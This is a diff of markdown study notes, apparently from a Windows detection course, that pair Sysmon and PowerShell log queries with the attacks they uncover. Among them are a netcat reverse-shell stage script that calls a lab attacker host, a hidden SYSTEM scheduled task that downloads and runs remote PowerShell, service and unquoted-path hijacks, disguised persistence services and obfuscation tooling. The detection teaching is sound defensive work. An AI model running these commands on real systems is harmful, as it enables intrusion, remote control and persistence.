@@ -252,8 +252,16 @@ Get-SysmonEvent 1 $null "7/28/2021 13:48:42" | Where-Object { $_.properties[3].v
 
 ## Remote Access with PowerShell Core
 
+```bash
+ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.51.50
+```
+
 ```pwsh
 Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
+```
+
+```bash
+xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /u:offsec /p:lab /v:192.168.51.10
 ```
 
 # Windows Server Side Attacks
@@ -262,7 +270,9 @@ Enter-PSSession 192.168.51.10 -Credential offsec -Authentication Negotiate
 
 ### Suspicious Logins
 
-Search for Logon events (Event ID **4624**) occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend). LogonType 10 indicates a RemoteInteractive logon (the use of Remote Desktop services to access the Windows machine, using the Remote Desktop Protocol (RDP))
+Search for Logon events (Event ID **4624**) occurring over the course of 2 days where it is expected that no users will be logged in (such as a weekend).
+
+**LogonType** 10 indicates a RemoteInteractive logon (the use of Remote Desktop services to access the Windows machine, using the RDP)
 
 ```pwsh
 Get-WinEvent -FilterHashTable @{LogName='Security'; StartTime="4/23/2024 19:00:00"; EndTime="4/26/2024 07:00:00"; ID=4624 } | Where-Object { $_.properties[8].value -eq 10 } | Format-List
@@ -293,7 +303,7 @@ function Get-SecurityEvent{
 }
 ```
 
-Search for a **logoff** event (Event ID **4634**) where the Logon ID is 0x323466
+Search for a **logoff** event (Event ID **4634**) where the **Logon ID** is 0x323466
 
 ```pwsh
 Get-SecurityEvent 4634 "5/1/2021 03:21:26" "5/3/2021 07:00:00" | Where-Object { $_.properties[3].value -eq 0x323466 } | Format-List
@@ -307,11 +317,13 @@ Get a list of all **failed Logon** events (Event ID **4625**) that occurred in t
 Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00"
 ```
 
-Logon Type 3 indicates a network-based logon. hydra uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.
+**LogonType** 3 indicates a network-based logon. hydra uses Network-Level Authentication (NLA). NLA forces an authentication to take place before the RDP session is initiated.
 
-The **Status** code C000006D indicates that the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect. Since we have NLA enabled, look at the **SubStatus** code C000006A to determine the details. Both the Status and Substatus explain the authentication failure.
+The **Status** code C000006D indicates that the failure is due to a bad username or authentication information. Other error codes specify that the username is nonexistent or that the password was incorrect.
 
-If we suspect logons are indicative of a brute force credential attack, consider extracting data from these events including Target User Name, Status, SubStatus, Logon Type, Workstation Name, and IP Address. 
+Since we have NLA enabled, look at the **SubStatus** code C000006A to determine the details. Both the Status and Substatus explain the authentication failure.
+
+If we suspect logons are indicative of a brute force credential attack, extract Target User Name, Status, SubStatus, Logon Type, Workstation Name, and IP Address. 
 
 ```pwsh
 Get-SecurityEvent 4625 "5/6/2021 00:00:00" "5/7/2021 00:00:00" | Format-List TimeCreated, @{Label = "Logon Type"; Expression = {$_.properties[10].value}}, @{Label = "Status"; Expression = {'{0:X8}' -f $_.properties[7].value}}, @{Label = "Substatus"; Expression = {'{0:X8}' -f $_.properties[9].value}}, @{Label = "Target User Name"; Expression = {$_.properties[5].value}}, @{Label = "Workstation Name"; Expression = {$_.properties[13].value}}, @{Label = "IP Address"; Expression = {$_.properties[19].value}}
@@ -324,22 +336,31 @@ Get-SecurityEvent 4624 "5/6/2021 09:36:44" "5/6/2021 09:37:44" | Where-Object { 
 ```
 
 Event ID **4801**: A workstation being locked or workstation being unlocked.
-LogonType 7: This workstation was unlocked.
+**LogonType** 7: This workstation was unlocked.
 
 
 ## Web Application Attacks
 
 IIS has a built-in logging mechanism that logs to `C:\inetpub\logs\LogFiles`. E.g. `C:\inetpub\logs\LogFiles\W3SVC1\u_ex210506.log.`
 
-The log files for the first instance (or site ID) of W3SVC1 (the World Wide Web Service). Any additional web service instances hosted by IIS would log under sequentially-numbered directories, such as W3SVC2, W3SVC3, etc.
+List the log files for the 1st instance (or site ID) of W3SVC1:
 
-Each log file begins with u_ex followed by a date code formatted as YYMMDD.
+```pwsh
+dir C:\inetpub\logs\LogFiles\W3SVC1
+```
+
+Any additional web service instances hosted by IIS would log under sequentially-numbered directories, such as W3SVC2, W3SVC3, etc.
+
+Each log file begins with `u_ex` followed by a date code formatted as YYMMDD.
+
 
 ### Local File Inclusion
 
 ### Command Injection
 
-The IIS log file reveals an HTTP POST to the vulnerable PATH used by the exploit. We don't see the POSTDATA in IIS logs, but we can confirm a direct attempt at posting data to this page at this particular time from 192.168.51.50. **Over 3700 milliseconds elapsed while executing the query**. If we had a baseline of 200-400 milliseconds for the amount of time this normally takes => this delay could be a greater source of suspicion for anomalous activity.
+The IIS log file reveals an HTTP POST to the vulnerable PATH used by the exploit. We don't see the POSTDATA in IIS logs, but we can confirm a direct attempt at posting data to this page at this particular time from 192.168.51.50. **Over 3700 milliseconds elapsed while executing the query**. If we had a baseline of 200-400 milliseconds for the amount of time this normally takes
+
+=> A greater source of suspicion for anomalous activity.
 
 Get any and all Sysmon events
 
@@ -347,29 +368,17 @@ Get any and all Sysmon events
 Get-SysmonEvent $null "05/10/2021 16:02:00" "5/10/2021 16:03:00"
 ```
 
-Sysmon's ProcessCreate events
+Search for Sysmon's ProcessCreate events
 
 ```pwsh
 Get-SysmonEvent 1 "05/10/2021 16:02:33" "5/10/2021 16:02:35" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
 ```
 
-When chaining processes with parent processes, use the process/parent process IDs located in the ProcessCreate events. When anomalous activity is identified, we can trace from parent to parent until we find the origin of the activity.
+When chaining processes with parent processes, use the process/parent process IDs located in the ProcessCreate events.
+
+When anomalous activity is identified, trace from parent to parent until we find the origin of the activity.
 
 ### File Upload
-
-Get any and all Sysmon events
-
-```pwsh
-Get-SysmonEvent $null "05/12/2021 12:48:00" "5/12/2021 12:49:00"
-```
-
-Search for **FileCreate** events
-
-With the PID, query **ProcessCreate** events in Sysmon to trace all of the processes involved in the creation of the file.
-
-```pwsh
-Get-SysmonEvent 11 "05/12/2021 12:48:50" "05/12/2021 12:48:52" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
-```
 
 `stage.bat`
 
@@ -386,33 +395,39 @@ wget http://192.168.51.50:8000/nc.exe -O /Windows/Temp/nc.exe
 /Windows/Temp/nc.exe 192.168.51.50 4444 -e cmd.exe
 ```
 
-=> Tracking the upload and execution of our stage.bat and load.ps1 scripts
+=> Tracking the upload and execution of our `stage.bat` and `load.ps1` scripts
 
-Query on all Sysmon events from 2:26 PM to 2:27 PM, since our IIS logs showed activity at 2:26:17 PM.
+Since our IIS logs showed activity at 2:26:17 PM, query on all Sysmon events from 2:26 PM to 2:27 PM
 
 ```pwsh
 Get-SysmonEvent $null "05/13/2021 14:26:00" "5/13/2021 14:27:00"
 ```
 
-Gather all **ProcessCreate** events that occurred at the 17 second mark. We notice our 2 command injections downloading and running `stage.bat`.
+Gather all **ProcessCreate** events that occurred at the 17s mark. => 2 command injections downloading and running `stage.bat`.
 
 ```pwsh
 Get-SysmonEvent 1 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List TimeCreated, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
 ```
 
-Since there were two **FileCreate** events in the same timeframe. The output shows `stage.bat` being written via `certutil.exe`. However, the creation of a PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script. We also have the PID for PowerShell (6784), so any ProcessCreate events with this PID can be traced back to this event.
+There were 2 **FileCreate** events in the same timeframe.
+
+- `stage.bat` being written via `certutil.exe`.
+
+- A PowerShell script in `C:\Windows\Temp` is an artifact of using `Invoke-Expression` to read in a PowerShell script.
 
 ```pwsh
 Get-SysmonEvent 11 "5/13/2021 14:26:16" "5/13/2021 14:26:18" | Format-List @{Label = "Rule"; Expression = {$_.properties[0].value}}, @{Label = "PID"; Expression = {$_.properties[3].value}},@{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "TargetFile"; Expression = {$_.properties[5].value}}
 ```
 
-Extract the Process ID (PID) and the Parent Process ID (PPID)
+We have the PID for PowerShell (6784).
+
+Any **ProcessCreate** events with this PID can be traced back to this event => extract the Process ID (PID) and the Parent Process ID (PPID):
 
 ```pwsh
 Get-SysmonEvent 1 "5/13/2021 14:26:17" "5/13/2021 14:26:19" | Format-List TimeCreated, @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "PPID"; Expression = {$_.properties[19].value}}, @{Label = "CommandLine"; Expression = {$_.properties[10].value}}, @{Label = "User"; Expression = {$_.properties[12].value}}, @{Label = "ParentImage"; Expression = {$_.properties[20].value}}
 ```
 
-NetworkConnect events
+Search for NetworkConnect events
 
 ```pwsh
 Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label = "PID"; Expression = {$_.properties[3].value}}, @{Label = "Image"; Expression = {$_.properties[4].value}}, @{Label = "User"; Expression = {$_.properties[5].value}}, @{Label = "Source IP"; Expression = {$_.properties[9].value}}, @{Label = "Source Port"; Expression = {$_.properties[11].value}}, @{Label = "Destination IP"; Expression = {$_.properties[14].value}}, @{Label = "Destination Port"; Expression = {$_.properties[16].value}}
@@ -422,13 +437,34 @@ Get-SysmonEvent 3 "5/13/2021 2:26:18" "5/13/2021 2:26:20" | Format-List @{Label 
 
 ```pwsh
 Start-Service -Name "Sync Breeze Enterprise"
-
 Get-Service -Name "Sync Breeze Enterprise" | Format-List -Property Status,Name,DisplayName
 ```
 
+ProcessCreate event: A **command prompt** was initiated by `syncbrs.exe`. The User field indicates that the **SYSTEM** user started the command prompt.
+
+NetworkConnect events: connections from our attacker machine to SyncBreeze on port 8080. The reverse shell also left traces as it called back to our Kali VM on port 4444.
+
+
 ### Windows Defender Exploit Guard (WDEG)
 
-Enable exploit protection for a specific process
+Windows Defender Exploit Guard (WDEG) is disabled by default. It was developed to address file-less malware attacks, or malware that operates almost exclusively in memory.
+
+WDEG has 4 major components:
+1. **Attack Surface Reduction** (ASR) addresses file-less malware attacks that hide within Microsoft Office documents. ASR can also block executable content or network communications from Adobe Reader, VBScript, and JavaScript.
+
+2. **Controlled folder access**: prevent applications from writing or making changes to directories specified by policy (Modern ransomware often maliciously encrypts user data). By default, the home directory of users (C:\Users\<user account>) are protected.
+
+3. **Network protection** relies on Microsoft's Intelligent Security Graph as a threat intelligence resource for domain and IP reputation. Anything less-than-reputable can be halted independently of what process or application initiated it.
+
+4. **Exploit protection**: Administrators must import an XML configuration file to set this up.
+
+=> Create a rule to enact Data Execution Prevention (DEP) for SyncBreeze to render the exploit inoperable. Rules can be created through the Windows GUI, by importing an XML Configuration, or with PowerShell.
+
+Validate API Invocation (or **CallerCheck**) is a protection mechanism that watches how API calls are invoked. This control will only allow functions to be accessed with a **call** assembly instruction, rather than a **return** instruction.
+
+Using return instructions to execute API calls is known as Return-Oriented Programming (ROP) and is used to bypass data execution prevention.
+
+Enable exploit protection for a specific process (The exploit will fail)
 
 ```pwsh
 Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable EnableRopCallerCheck
@@ -438,35 +474,63 @@ Get-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\s
 Restart-Service -Name "Sync Breeze Enterprise"
 ```
 
+The event that is generated will not appear in Windows Security event logs, but rather in the **Security-Mitigations** logs.
+
 ```pwsh
 Get-WinEvent -FilterHashTable @{LogName = 'Microsoft-Windows-Security-Mitigations/UserMode'; StartTime = '5/25/2021 13:42:28'; EndTime = '5/25/2021 13:42:30'} | Format-List -Property Id, TimeCreated, LevelDisplayName, Message
 ```
 
-Turn auditing on for Windows exploit protection.
-
-Remove our SyncBreeze configuration. Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit. This should not block the activity but still generate events.
+Turn auditing on for Windows exploit protection. (should not block the activity but still generate events.)
+- Remove our SyncBreeze configuration
+- Reconfigure our exploit protections to only audit the return-oriented API calls used by the SyncBreeze exploit.
 
 ```pwsh
 Remove-Item -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\syncbrs.exe'
 
 Set-ProcessMitigation -Name 'C:\Program Files (x86)\Sync Breeze Enterprise\bin\syncbrs.exe' -Enable AuditEnableRopCallerCheck
+
+Restart-Service -Name "Sync Breeze Enterprise"
 ```
 
 # Windows Client Side Attacks
 
-DNSEvent (Event ID 22)
+Query for the ProcessCreate event: PowerShell was started with a base64-encoded payload. The CommandLine field shows the abbr. payload as executed on the command line. The Parent Process ID belongs to Microsoft Word, and the ParentCommandLine reveals the Word document `Engineer_Resume.doc`.
+
+```pwsh
+Get-SysmonEvent 1 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
+```
+
+Query for the FileCreate event: A temporary PowerShell file is written to `C:\Users\offsec\AppData\Local\Temp`
+
+```pwsh
+Get-SysmonEvent 11 "6/17/2021 15:10:38" "6/17/2021 15:10:40" | Format-List
+```
+
+Query for the **DNSEvent** created by our attachnment (Event ID 22)
 
 ```pwsh
 Get-SysmonEvent 22 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Format-List
 ```
 
-NetworkConnect events
+2 NetworkConnect events: filter on the destination IP `192.168.51.50` (PowerShell is initiating separate network sessions as a result of the two-stage malware infection)
 
 ```pwsh
 Get-SysmonEvent 3 "6/17/2021 15:10:41" "6/17/2021 15:11:00" | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
 ```
 
-## PowerShell Module Logging
+## PowerShell Logging
+
+3 different types of PowerShell logging: Module, Script Block, and Transcription.
+
+Launch the **Local Group Policy Editor**, gpedit.msc, and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`
+
+### PowerShell Module Logging
+
+Change the setting `Turn on Module Logging` from Not Configured to Enabled.
+
+This also activates the **Show...** button next to **Module Names** > specify what modules this policy needs to log.
+
+Rather than list out every possible module, enter a wildcard ("*") character so that we can log all PowerShell modules.
 
 Collect information on all currently running processes
 
@@ -474,21 +538,34 @@ Collect information on all currently running processes
 Get-WmiObject -Class Win32_Process | Format-Table ProcessId, ParentProcessId, Name; Write-Host (Get-Date)
 ```
 
-Event ID for pipeline execution events enabled by module logging is 4103. The Command Name indicates which cmdlet initiated this pipeline execution. Had it been a script, it would have been reflected in the Script Name. The Sequence Number tracks the order in which PowerShell events execute, while Pipeline ID tracks commands within a given pipeline. We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.
+Event ID for pipeline execution events enabled by module logging is **4103**.
 
 ```pwsh
 Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="6/14/2021 13:25:52"; EndTime="6/14/2021 13:25:54"; ID=4103} | Format-List
 ```
 
-## PowerShell Script Block Logging
+- Command Name indicates which cmdlet initiated this pipeline execution. Or the Script Name.
+- Sequence Number tracks the order in which PowerShell events execute.
+- Pipeline ID tracks commands within a given pipeline.
 
-The use of script block logging to help with the deobfuscation of PowerShell commands (Our output includes a conveniently decoded series of PowerShell commands)
+We could trace an entire series of PowerShell commands using the Pipeline ID, and order them based on the Sequence Number.
+
+
+### PowerShell Script Block Logging
+
+Open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.
+
+Change the setting `Turn on PowerShell Script Block Logging` from Not Configured to Enabled.
+
+Uncheck the option to **Log script block execution start / stop events**.
+
+The use of script block logging to help with the **deobfuscation** of PowerShell commands.
 
 ```pwsh
 { "This is a script block" }; Write-Host (Get-Date)
 ```
 
-The Event ID for remote command execution events enabled by script block logging is 4104
+The Event ID for remote command execution events enabled by script block logging is **4104**.
 
 ```pwsh
 Get-WinEvent -FilterHashtable @{Logname='Microsoft-Windows-PowerShell/Operational'; StartTime="06/15/2021 14:49:42"; EndTime="06/15/2021 14:49:44"; ID=4104} | Format-List
@@ -504,16 +581,24 @@ $EncodedCommand
 ```
 
 ```pwsh
-powershell -Encoded VwByAGkAdABlAC0ASABvAHMAdAAgACgARwBlAHQALQBEAGEAdABlACkAOwAgAEcAZQB0AC0ASABvAHQAZgBpAHgA
+powershell -Encoded <$EncodedCommand>
 ```
 
-## PowerShell Transcription
+### PowerShell Transcription
 
-```pwsh
-Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer
-```
+PowerShell transcription will generate full records of a PowerShell session, with all input and output stored in a text file.
 
-`Get-PSLog.psm1`
+To enable transcription for PowerShell, open `gpedit.msc` and navigate to `Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`.
+
+Change the setting **Turn on Powershell Transcription** from Not Configured to Enabled.
+
+Also select the checkbox for **Include Evocation Headers** so that timestamps are produced for each command in our transcripts.
+
+navigate to the `C:\Users\offsec\Documents\YYYYMMDD` directory, we'll find a text file titled `PowerShell_transcript.HOSTNAME.UNIQUEID.YYYYMMDDHHMMSS.txt`
+
+### Case Study: Phishing Attacks
+
+`Import-Module C:\Sysmon\Get-PSLog.psm1`
 
 ```pwsh
 function Get-PSLogEvent{
@@ -540,38 +625,62 @@ function Get-PSLogEvent{
 ```
 
 ```pwsh
+Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table Timecreated, LevelDisplayName, Message
 Get-PSLogEvent 4104 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
+```
 
+```pwsh
 Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-Table TimeCreated, LevelDisplayName, Message
-
 Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:45:00" | Format-List
+```
 
+Extracting the Payload from Each Module Log Event Message
+
+```pwsh
 Get-PSLogEvent 4103 "6/15/2021 15:44:00" "6/15/2021 15:44:59" | Format-List TimeCreated, @{Label = "Payload"; Expression = {$_.properties[2].value}}
 ```
 
-Obfuscate a basic PowerShell command
+Obfuscate a PowerShell command
 
 ```pwsh
 Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 ```
 
+Choose Ticks as our obfuscation technique for the command tokens.
+Arguments can also be obfuscated using random case, concatenation of strings, and **reordering** the text altogether
+
 ```
-Invoke-Obfuscation> SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
-Invoke-Obfuscation> token
-Invoke-Obfuscation\Token> command
-Invoke-Obfuscation\Token\Command> 1
-Invoke-Obfuscation\Token\Command> back
-Invoke-Obfuscation\Token> argument
-Invoke-Obfuscation\Token\Argument> 4
-Invoke-Obfuscation\Token\Argument> show
+SET SCRIPTBLOCK Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)
+back
+show
 ```
+
+CommandLineSyntax:
+
+```pwsh
+Invoke-Obfuscation -ScriptBlock {Get-CimInstance Win32_ComputerSystem | Select-Object -Property Name, PrimaryOwnerName, Domain, TotalPhysicalMemory, Model, Manufacturer; Write-Host (Get-Date)} -Command 'Token\Command\1,Token\Argument\4' -Quiet
+```
+
+Query script block events => the obfuscation makes it harder for us to understand what's happening
+
+```pwsh
+Get-PSLogEvent 4104 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
+```
+
+Query module log events within the same time range 
+
+```pwsh
+Get-PSLogEvent 4103 "6/21/2021 19:35:06" "6/21/2021 19:35:08" | Format-List
+```
+
+Use **Revoke-Obfuscation** (`https://github.com/danielbohannon/Revoke-Obfuscation`) to detect obfuscated PowerShell commands and scripts. In some cases, it can even help reconstruct an obfuscated PowerShell script that has been executed.
 
 ```pwsh
 Import-Module C:\tools\windows_client_side_attacks\Revoke-Obfuscation\Revoke-Obfuscation.psm1
 ```
 
-Export PowerShell logs from the command line, we'll use wevtutil,7 a command-line utility for listing and saving event logs in an XML-based event file format (.evtx).
+To export PowerShell logs from the command line, use **wevtutil**, a command-line utility for listing and saving event logs in an XML-based event file format (`.evtx`).
 
 ```pwsh
 wevtutil export-log Microsoft-Windows-PowerShell/Operational C:\users\offsec\Desktop\pwsh_export.evtx
@@ -581,4 +690,345 @@ Reassemble script blocks from script block (ID: 4104) events
 
 ```pwsh
 Get-RvoScriptBlock -Path 'C:\Users\offsec\Desktop\pwsh_export.evtx' -Verbose
+```
+
+# Windows Privilege Escalation
+
+```pwsh
+.\accesschk64.exe -uws "Everyone" "C:\Program Files (x86)\"
+```
+
+```pwsh
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks | Format-List
+```
+
+## Bypassing UAC
+
+Output the modify registry events, whose IDs are equal to **13**.
+
+```pwsh
+Get-SysmonEvent 13 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
+```
+
+ProcessCreate events
+
+```pwsh
+Get-SysmonEvent 1 "06/28/2021 13:41:35" "06/28/2021 13:41:37" | Format-List
+```
+
+Query the PowerShell module log entries
+
+```pwsh
+Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45"
+Get-PSLogEvent 4103 "6/28/2021 13:41:35" "6/28/2021 13:41:45" | Format-List
+```
+
+Use the `Where-Object` cmdlet on the **Image** field containing the string "fodshell"
+
+```pwsh
+Get-SysmonEvent 1 "06/28/2021 13:41:00" "06/28/2021 13:42:00" | Where-Object { $_.properties[4].value -like "*fodshell*" } | Format-List
+```
+
+## Escalating to SYSTEM
+
+### Service Creation
+
+Use Windows services and named pipes to escalate privileges (Meterpreter getsystem command)
+
+Event with ID 4697: A service was installed in the system
+
+```pwsh
+Get-SecurityEvent 4697 "6/30/2021 12:49:31" "6/30/2021 12:49:33" | Format-List
+```
+
+Display RegistryEvent entries
+
+```pwsh
+Get-SysmonEvent 13 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
+```
+
+1. writes 0x00000003 to the Start key of the hvaukz service. This sets the new service to a **Manual** start-up, rather than when the system boots.
+2. sets the **ImagePath** key of the **hvaukz** service to the named pipe.
+3. changes the value of the Start key for the hvaukz service. The value 0x00000004 indicates that the service will be changed from Manual to **Disabled**.
+
+```pwsh
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz
+```
+
+View the ProcessCreate event
+
+```pwsh
+Get-SysmonEvent 1 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List
+```
+
+### Attacking Service Permissions
+
+When querying services with Service Control in PowerShell, use the `sc.exe` filename and not just `sc`.
+
+The `Set-Content` cmdlet in PowerShell can be abbreviated with `sc`, and the PowerShell prompt prioritizes cmdlets over Windows commands.
+
+```pwsh
+sc.exe qc Serviio
+```
+
+Enumerate the permissions of installed services
+
+* -c argument to specify a Windows Service by name, the wildcard * to query all Windows services
+* -l for the full security descriptor
+
+```pwsh
+.\accesschk64.exe -c Serviio -l
+```
+
+```pwsh
+C:\Windows\system32\sc.exe config Serviio binpath= 'C:\tools\servshell_443.exe'
+net start serviio
+```
+
+Examine the ProcessCreate event (sc.exe made the configuration change)
+
+```pwsh
+Get-SysmonEvent 1 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
+```
+
+Review the RegistryEvent entry (HKLM\System\CurrentControlSet\Services\Serviio\ImagePath Windows Registry key is changed)
+
+```pwsh
+Get-SysmonEvent 13 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List
+```
+
+```pwsh
+Get-SysmonEvent 1 "7/1/2021 10:56:09" "7/1/2021 10:56:11" | Format-List @{ Label = 'UtcTime'; Expression = { $_.properties[1].value }}, @{ Label = 'Image'; Expression = { $_.properties[4].value }}, @{ Label = 'ProcessId'; Expression = { $_.properties[3].value }}, @{ Label = 'CommandLine'; Expression = { $_.properties[10].value }}, @{Label = 'User'; Expression = { $_.properties[12].value }}, @{ Label = 'ParentImage'; Expression = { $_.properties[20].value }}, @{ Label = 'ParentProcessId'; Expression = { $_.properties[19].value }}
+```
+
+### Leveraging Unquoted Service Paths
+
+```pwsh
+Import-Module .\PowerUp.ps1
+Get-UnquotedService
+```
+
+```pwsh
+sc.exe qc IOBitUnSvr
+...
+BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
+```
+
+```pwsh
+copy .\servshell_443.exe 'C:\Program Files (x86)\IObit\IOBit.exe'
+shutdown -r -t 0
+```
+
+FileCreate events
+
+```pwsh
+Get-SysmonEvent 11 "7/8/2021 10:49:33" "7/8/2021 10:49:35" | Format-List
+```
+
+Search across all ProcessCreate events where the Image field contains the wildcarded filename `IOBit.exe`
+
+```pwsh
+Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*IOBit.exe*" } | Format-List
+```
+
+# Windows Persistence
+
+## Persisting via Windows Service
+
+Creates a new service named "VindowsUpdate".
+- (start= auto) indicates that the service should start after the operating system boots, even if no users have logged on.
+- error= ignore parameter indicates that service errors are logged without notifying the user or interrupting system startup.
+- binpath= C:\tools\windows_persistence\prst_servshell443.exe" details the location of the binary.
+
+```pwsh
+sc.exe create VindowsUpdate start= auto error= ignore binpath= C:\tools\windows_persistence\prst_servshell443.exe
+shutdown -r -t 0
+```
+
+Query all events in the Security log
+
+```pwsh
+Get-SecurityEvent $null "10/29/2021 11:43:00" "10/29/2021 11:44:00" | Format-List
+```
+
+An event entry (Event Id 4697) indicating that a service was installed in the system.
+
+Note that `prst_servshell443.exe` was on the target already. Attackers trying to create their own service will often upload their preferred service binary first. => search for **FileCreate** events.
+
+1 ProcessCreate event (`sc.exe`) and 2 RegistryEvent entries.
+
+```pwsh
+Get-SysmonEvent 1 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
+```
+
+```pwsh
+Get-SysmonEvent 13 "10/29/2021 11:43:49" "10/29/2021 11:43:51" | Format-List
+```
+
+The Service Control Manager (`services.exe`) has added new values in the `HKEY_LOCAL_MACHINE` (HKLM) hive.
+
+- The **Start** value created in the **VindowsUpdate** key. The Start value contains a single DWORD for the **Startup** type. The 32-bit value of "2" represents the **AUTO** Startup type that we set for this service.
+
+- The **ImagePath** value of our service configuration, which is the full path to `prst_servshell443.exe`.
+
+
+Filter on ProcessCreate events where the Image field contains the filename `prst_servshell443.exe`
+
+```pwsh
+Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*prst_servshell443.exe*" } | Format-List
+```
+
+Find any other ProcessCreate events where the ParentProcessId (PPID) matches the ProcessId of prst_servshell443.exe (3140)
+
+```pwsh
+Get-SysmonEvent 1 "10/29/2021 12:33:41" | Where-Object { $_.properties[19].value -eq 3140 } | Format-List
+```
+
+`rundll32.exe` is executed from our VindowsUpdate service with a PID of 3332. The `rundll32.exe` file loads DLLs in the Windows environment. In this case, it is the staged Meterpreter DLL payload.
+
+Investigate **NetworkConnect** events with the same filter parameters for PID
+
+```pwsh
+Get-SysmonEvent 3 "10/29/2021 12:33:41" | Where-Object { $_.properties[3].value -eq 3332 } | Format-List
+```
+
+A defender could watch for changes or additions to key values in `HKLM\System\CurrentControlSet\Services\`. 
+
+Look for a ProcessCreate event where the ParentImage is `dropper.exe`.
+
+```pwsh
+Get-SysmonEvent 1 | Where-Object { $_.properties[20].value -like "*dropper.exe*" } | Format-List
+```
+
+Look for a **FileCreate** event. Filter on the **Image** field containing a filename that matches `rundll32.exe`
+
+```pwsh
+Get-SysmonEvent 11 | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
+```
+
+Look for a **DnsQuery** event where the Image field contains the file `exercise_service.exe`.
+
+```pwsh
+Get-SysmonEvent 22 | Where-Object { $_.properties[7].value -like "*exercise_service.exe*" } | Format-List
+```
+
+Look for a **NetworkConnect** event within the same minute of the DnsQuery event where the destination IP is 192.168.51.50
+
+```pwsh
+Get-SysmonEvent 3 | Where-Object { $_.properties[14].value -eq "192.168.51.50" } | Format-List
+```
+
+## Persisting via Scheduled Tasks
+
+```pwsh
+schtasks /query /tn MicrosoftEdgeUpdateTaskMachineCore
+```
+
+Scheduled tasks are  stored in `C:\Windows\System32\Tasks` and are accessible only with Administrative privileges. E.g., `C:\Windows\System32\Tasks\MicrosoftEdgeUpdateTaskMachineCore`
+
+```bat
+schtasks /create /tn WindowzUpdate /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://kali:8000/eviltask'''))'" /sc minute /ru System /rl HIGHEST
+```
+
+Event 469813 indicates that a new scheduled task was installed.
+
+```pwsh
+Get-SecurityEvent 4698 "11/12/2021 7:26:00" "11/12/2021 7:27:00" | Format-List
+```
+
+Examine the ProcessCreate (schtasks command)
+
+```pwsh
+Get-SysmonEvent 1 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
+```
+
+FileCreate event: `C:\Windows\System32\Tasks\WindowzUpdate` file creation from `svchost.exe`
+
+```pwsh
+Get-SysmonEvent 11 "11/12/2021 7:26:02" "11/12/2021 7:26:04" | Format-List
+```
+
+ProcessCreate event
+
+```pwsh
